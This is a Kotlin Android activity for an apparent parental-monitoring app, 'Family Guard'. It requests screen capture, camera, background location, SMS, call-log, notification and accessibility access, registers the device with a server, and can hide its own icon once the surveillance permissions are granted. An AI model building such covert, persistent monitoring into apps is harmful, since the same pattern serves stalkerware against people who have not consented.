package com.example.parentalchild

import android.Manifest
import android.app.Activity
import android.app.AlarmManager
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import java.util.UUID
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {

    private val deviceId by lazy {
        getPreferences(MODE_PRIVATE).getString("deviceId", null)
            ?: UUID.randomUUID().toString().also {
                getPreferences(MODE_PRIVATE).edit().putString("deviceId", it).apply()
            }
    }

    private lateinit var tvPairing: TextView
    private lateinit var tvStatus: TextView
    private lateinit var dpm: DevicePolicyManager
    private lateinit var adminComp: ComponentName

    private val screenLauncher = registerForActivityResult(
        ActivityResultContracts.StartActivityForResult()
    ) { r ->
        if (r.resultCode == Activity.RESULT_OK && r.data != null) {
            val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
                putExtra("resultCode", r.resultCode)
                putExtra("code", r.data)
                putExtra("deviceId", deviceId)
            }
            ContextCompat.startForegroundService(this, serviceIntent)
            setStatus("✅ Screen capture ruxsati berildi")
        } else {
            setStatus("❌ Screen capture bekor qilindi")
        }
    }

    private val telephonyLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val callOk = results[Manifest.permission.READ_CALL_LOG] == true
        val smsOk = results[Manifest.permission.READ_SMS] == true
        if (callOk && smsOk) {
            setStatus("✅ Qo'ng'iroqlar va SMS ruxsatlari berildi")
        } else {
            setStatus("❌ Qo'ng'iroq yoki SMS ruxsati rad etildi")
        }
    }

    private val camLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Kamera ruxsati berildi" else "❌ Kamera rad etildi") }

    private val notifLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Bildirishnoma ruxsati berildi" else "⚠️ Bildirishnoma rad etildi") }

    private val locLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        val ok = results[Manifest.permission.ACCESS_FINE_LOCATION] == true ||
                results[Manifest.permission.ACCESS_COARSE_LOCATION] == true
        if (ok && Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            bgLocLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        } else {
            setStatus(if (ok) "✅ Lokatsiya ruxsati berildi" else "❌ Lokatsiya rad etildi")
        }
    }

    private val bgLocLauncher = registerForActivityResult(
        ActivityResultContracts.RequestPermission()
    ) { ok -> setStatus(if (ok) "✅ Lokatsiya (background) berildi" else "⚠️ Faqat ilova ochiq paytda") }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComp = ComponentName(this, DeviceAdminReceiver::class.java)

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(40, 60, 40, 40)
        }

        tvPairing = TextView(this).apply { textSize = 16f; text = "Ulanmoqda..." }
        tvStatus = TextView(this).apply { textSize = 13f; setPadding(0, 8, 0, 24) }

        root.addView(tvPairing)
        root.addView(tvStatus)

        root.addView(makeBtn("📱 Screen capture ruxsati") { requestScreen() })
        root.addView(makeBtn("📷 Kamera ruxsati") { requestCamera() })
        root.addView(makeBtn("📍 Lokatsiya ruxsati") { requestLocation() })
        root.addView(makeBtn("🔔 Notification Listener ruxsati") { checkAndRequestNotificationPermission() })
        root.addView(makeBtn("📊 Ilovalar statistikasi ruxsati") { requestUsageStats() })
        root.addView(makeBtn("♿ Accessibility ruxsati (Screenshot)") { requestAccessibility() })
        root.addView(makeBtn("📞 Qo'ng'iroqlar va SMS ruxsati") { requestTelephonyPermissions() })
        root.addView(makeBtn("📋 Loglarni konsolga chiqarish (Test)") { printTelephonyLogs() })
        root.addView(makeBtn("⚡ Batareya cheklovini olib tashlash") { requestBatteryOptimization() })
        root.addView(makeBtn("⏰ Aniq alarm ruxsati") { requestExactAlarm() })
        root.addView(makeBtn(
            if (dpm.isAdminActive(adminComp)) "✅ Device Admin yoqilgan" else "🔐 Device Admin yoqish"
        ) { requestAdmin() })
        root.addView(makeBtn("🙈 Ilovaning ikonkasini yashirish") { showHideAppDialog() })
        root.addView(makeBtn("👁️ Ilovaning ikonkasini ko'rsatish") { showLauncherIcon() })

        setContentView(root)

        // Service'ni xavfsiz start qilish
        val serviceIntent = Intent(this, ScreenCaptureService::class.java).apply {
            putExtra("deviceId", deviceId)
        }
        try {
            ContextCompat.startForegroundService(this, serviceIntent)
        } catch (_: Exception) {}

        // Server ulanishini tekshirish
        tvPairing.text = "Device ID: $deviceId\nUlanmoqda..."
        thread {
            try {
                val api = Api(BuildConfig.API_URL, BuildConfig.DEVICE_SECRET)
                val code = api.register(deviceId, "Child device")
                runOnUiThread {
                    tvPairing.text = "✅ Ulandi!\nPairing kod: $code"
                }
            } catch (e: Exception) {
                runOnUiThread {
                    tvPairing.text = "❌ Ulanmadi: ${e.message}"
                }
            }
        }

        // Watchdog rejalashtirish
        WatchdogReceiver.schedule(this)

        // Android 13+ da bildirishnoma ko'rsatish ruxsatini so'rash
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                != PackageManager.PERMISSION_GRANTED
            ) {
                notifLauncher.launch(Manifest.permission.POST_NOTIFICATIONS)
            }
        }
    }

    private fun checkAndRequestNotificationPermission() {
        if (!isNotificationServiceEnabled()) {
            Toast.makeText(
                this,
                "Bildirishnomalarni o'qish uchun sozlamalardan ruxsat bering",
                Toast.LENGTH_LONG
            ).show()
            val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
            startActivity(intent)
        } else {
            setStatus("✅ Notification Listener ruxsati bor")
        }
    }

    private fun isNotificationServiceEnabled(): Boolean {
        val flat = Settings.Secure.getString(contentResolver, "enabled_notification_listeners")
        return flat != null && flat.contains(packageName)
    }

    private fun makeBtn(text: String, onClick: () -> Unit) = Button(this).apply {
        this.text = text
        setOnClickListener { onClick() }
    }

    private fun showHideAppDialog() {
        AlertDialog.Builder(this)
            .setTitle("Ilovaning ikonkasini yashirish")
            .setMessage("Ilovani menyudan yashirishni xohlaysizmi?")
            .setPositiveButton("Ha, yashirilsin") { dialog, _ ->
                hideLauncherIcon()
                dialog.dismiss()
            }
            .setNegativeButton("Yo'q") { dialog, _ -> dialog.dismiss() }
            .setCancelable(false)
            .show()
    }

    private fun requestTelephonyPermissions() {
        telephonyLauncher.launch(
            arrayOf(
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_SMS
            )
        )
    }

    private fun printTelephonyLogs() {
        val helper = TelephonyHelper(this)

        val calls = helper.getCallLogs(5)
        println("--- OXIRGI QO'NG'IROQLAR ---")
        calls.forEach { call ->
            println("Raqam: ${call.number} | Turi: ${call.type} | Davomiyligi: ${call.durationSec} soniya")
        }

        val smsList = helper.getSmsLogs(5)
        println("--- OXIRGI SMS'LAR ---")
        smsList.forEach { sms ->
            println("Raqam: ${sms.address} | Turi: ${sms.type} | Matn: ${sms.body}")
        }

        setStatus("✅ Oxirgi loglar Logcat (Konsol)ga chiqarildi")
    }

    private fun showLauncherIcon() {
        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
            PackageManager.DONT_KILL_APP
        )
        setStatus("✅ Ilova ikonkasi qaytarildi")
    }

    private fun hideLauncherIcon() {
        val missing = mutableListOf<String>()

        if (!FamilyGuardAccessibilityService.isEnabled())
            missing.add("Accessibility")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED
        )
            missing.add("Qo'ng'iroqlar")
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS)
            != PackageManager.PERMISSION_GRANTED
        )
            missing.add("SMS")
        if (!isNotificationServiceEnabled())
            missing.add("Bildirishnomalar")

        if (missing.isNotEmpty()) {
            AlertDialog.Builder(this)
                .setTitle("⚠️ Ruxsatlar yetishmayapti")
                .setMessage("Quyidagi ruxsatlar berilmagan:\n${missing.joinToString("\n• ", "• ")}\n\nYashirishdan oldin barcha ruxsatlarni bering!")
                .setPositiveButton("OK") { d, _ -> d.dismiss() }
                .show()
            return
        }

        val componentName = ComponentName(this, MainActivity::class.java)
        packageManager.setComponentEnabledSetting(
            componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP
        )
        setStatus("✅ Ilova ikonkasi yashirildi")
    }

    private fun setStatus(msg: String) {
        if (::tvStatus.isInitialized) tvStatus.text = msg
    }

    private fun requestAccessibility() {
        if (FamilyGuardAccessibilityService.isEnabled()) {
            setStatus("✅ Accessibility Service yoqilgan — Screenshot ishlaydi")
            return
        }
        setStatus("⚠️ Sozlamalar ochilmoqda — Family Guard ni toping va yoqing")
        startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
    }

    private fun requestScreen() {
        screenLauncher.launch(
            (getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager)
                .createScreenCaptureIntent()
        )
    }

    private fun requestCamera() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            == PackageManager.PERMISSION_GRANTED
        )
            setStatus("✅ Kamera ruxsati bor")
        else camLauncher.launch(Manifest.permission.CAMERA)
    }

    private fun requestLocation() {
        val fine = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_FINE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        val coarse = ContextCompat.checkSelfPermission(
            this, Manifest.permission.ACCESS_COARSE_LOCATION
        ) == PackageManager.PERMISSION_GRANTED
        if (fine || coarse) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                val bg = ContextCompat.checkSelfPermission(
                    this, Manifest.permission.ACCESS_BACKGROUND_LOCATION
                ) == PackageManager.PERMISSION_GRANTED
                if (!bg) bgLocLauncher.launch(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
                else setStatus("✅ Lokatsiya ruxsati bor (background)")
            } else setStatus("✅ Lokatsiya ruxsati bor")
        } else {
            locLauncher.launch(
                arrayOf(
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                )
            )
        }
    }

    private fun requestUsageStats() {
        if (AppHelper(this).hasUsagePermission()) {
            setStatus("✅ Ilovalar statistikasi ruxsati bor")
        } else {
            setStatus("⚠️ Sozlamalar ochilmoqda — Family Guard ni toping va yoqing")
            startActivity(Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS))
        }
    }

    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val pm = getSystemService(android.os.PowerManager::class.java)
            if (pm.isIgnoringBatteryOptimizations(packageName)) {
                setStatus("✅ Batareya cheklovi olib tashlangan")
            } else {
                try {
                    startActivity(Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
                        data = Uri.parse("package:$packageName")
                    })
                } catch (_: Exception) {
                    startActivity(Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS))
                }
            }
        }
    }

    private fun requestExactAlarm() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val am = getSystemService(AlarmManager::class.java)
            if (am.canScheduleExactAlarms()) {
                setStatus("✅ Aniq alarm ruxsati bor")
            } else {
                setStatus("⚠️ Sozlamalar ochilmoqda — Family Guard ni toping va yoqing")
                startActivity(Intent(Settings.ACTION_REQUEST_SCHEDULE_EXACT_ALARM).apply {
                    data = Uri.parse("package:$packageName")
                })
            }
        } else {
            setStatus("✅ Bu Android versiyasida shart emas")
        }
    }

    private fun requestAdmin() {
        if (dpm.isAdminActive(adminComp)) {
            setStatus("✅ Admin allaqachon yoqilgan")
            return
        }
        startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Family Guard nazorat uchun.")
        })
    }
}
